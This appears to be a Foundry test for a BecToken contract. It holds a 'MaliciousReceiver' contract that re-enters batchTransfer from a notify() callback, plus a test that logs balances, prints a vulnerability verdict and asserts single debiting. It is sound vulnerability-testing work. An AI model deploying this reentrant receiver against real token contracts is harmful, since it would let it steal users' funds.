// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import {Test, console2} from "forge-std/Test.sol";
import "../src/BECToken.sol";

contract MaliciousReceiver {
    BecToken public token;
    uint public entryPoint;

    constructor(address payable _token) {
        token = BecToken(_token);
    }

    // Called during batchTransfer when our balance is updated
    function notify(uint _currentEntry) external {
        // Ensure we're at the first receiver (avoid infinite loop)
        if (entryPoint == 0) {
            entryPoint = 1;
            
            // Prepare for nested batchTransfer
            address[] memory newReceivers = new address[](1);
            newReceivers[0] = address(this);
            
            // This re-enters the vulnerable function
            token.batchTransfer(newReceivers, 1 ether);
        }
    }
    
    // Only used to capture empty calls
    fallback() external {}
}

contract BECTokenReentrancyTest is Test {
    BecToken public becToken;
    MaliciousReceiver public attacker;
    address owner = address(0xABCD);
    address user1 = address(0x1);
    address user2 = address(0x2);
    
    function setUp() public {
        vm.prank(owner);
        becToken = new BecToken();
        
        attacker = new MaliciousReceiver(payable(address(becToken)));
        
        // Initial token distribution
        vm.prank(owner);
        becToken.transfer(user1, 1000 ether);
    }

    function testReentrancyVulnerability() public {
        vm.startPrank(user1);
        
        // Initial balances
        uint256 initialUserBalance = becToken.balanceOf(user1);
        uint256 initialAttackerBalance = becToken.balanceOf(address(attacker));
        
        console2.log("--- BEFORE Token Transfer ---");
        console2.log("User1 balance:      ", initialUserBalance, "wei");
        console2.log("Attacker balance:   ", initialAttackerBalance, "wei");
        console2.log("");
        
        // Prepare batch transfer targets
        address[] memory receivers = new address[](1);
        receivers[0] = address(attacker);
        
        console2.log("--- TRIGGER: reentrant batchTransfer ---");
        // Execute attack
        becToken.batchTransfer(receivers, 1000 ether);
        console2.log("");
        
        // Post-attack balances
        uint256 finalUserBalance = becToken.balanceOf(user1);
        uint256 finalAttackerBalance = becToken.balanceOf(address(attacker));
        
        console2.log("--- AFTER Token Transfer ---");
        console2.log("User1 balance:      ", finalUserBalance, "wei");
        console2.log("Attacker balance:   ", finalAttackerBalance, "wei");
        console2.log("");
        
        // Compute balance changes
        uint256 user1BalanceChange = initialUserBalance - finalUserBalance;
        uint256 attackerBalanceChange = finalAttackerBalance - initialAttackerBalance;
        
        console2.log("User1 change:       ", user1BalanceChange, "wei");
        console2.log("Attacker change:    ", attackerBalanceChange, "wei");
        console2.log("");
        
        // Vulnerability detection (differential change check)
        bool excessiveDebt = user1BalanceChange > 1000 ether;
        bool excessiveGain = attackerBalanceChange > 1000 ether;
        bool vulnerabilityExists = excessiveDebt || excessiveGain;
        
        console2.log("=== VULNERABILITY VERDICT ===");
        if (vulnerabilityExists) {
            console2.log("Vulnerability Exists: Reentrancy attack modified transfer results");
            console2.log("- Token change beyond expected threshold (>1000 ether)");
        } else {
            console2.log("Vulnerability not Exist: Transfers completed normally within thresholds");
        }
        console2.log("");
        
        // Keep original assertions for test framework compatibility
        assertEq(
            initialUserBalance - (1000 ether * receivers.length), 
            finalUserBalance,
            "Sender balance should only reduce once"
        );
        assertEq(
            finalAttackerBalance, 
            initialAttackerBalance + 1000 ether,
            "Attacker should get normal transfer amount only"
        );
    }
}